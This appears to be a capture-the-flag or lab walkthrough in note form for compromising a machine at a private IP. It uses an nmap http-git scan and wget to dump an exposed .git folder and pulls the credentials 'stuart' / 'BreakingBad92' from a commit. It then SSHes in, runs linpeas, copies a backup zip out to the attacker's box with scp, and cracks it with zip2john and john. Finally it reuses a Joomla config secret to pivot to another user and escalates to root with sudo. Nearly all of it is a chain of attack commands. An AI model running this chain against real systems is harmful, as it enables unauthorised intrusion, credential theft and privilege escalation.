nmap scan

nmap -p 80 --script=http-git 192.168.154.144

wget -r "http://192.168.154.144/.git/"

cd into git folder (named after the target ip address)

git log

git show **44a055daf7a0cd777f28f444c0d29ddf3ff08c54**
	==> the commit log associated with security update
	==> revealed creds; stuart@challenge.lab BreakingBad92

ssh stuart@192.168.154.144

linpeas enumeration

grep -A 10 "Backup folders" /tmp/linpeas.out

scp /opt/backup/sitebackup3.zip kali@192.168.kali.ip:~/

zip2john sitebackup3.zip > sitebackup3.hash

john --wordlist=/usr/share/wordlists/rockyou.txt sitebackup3.hash

cd joomla

grep -Ri 'passw' . | head -10
cat configuration.php | head -40

Look out for user, password, secret

Reuse $secret to pivot to user chloe (enumerated from config.php)

sudo -l 
	==> (ALL : ALL) ALL

sudo su -



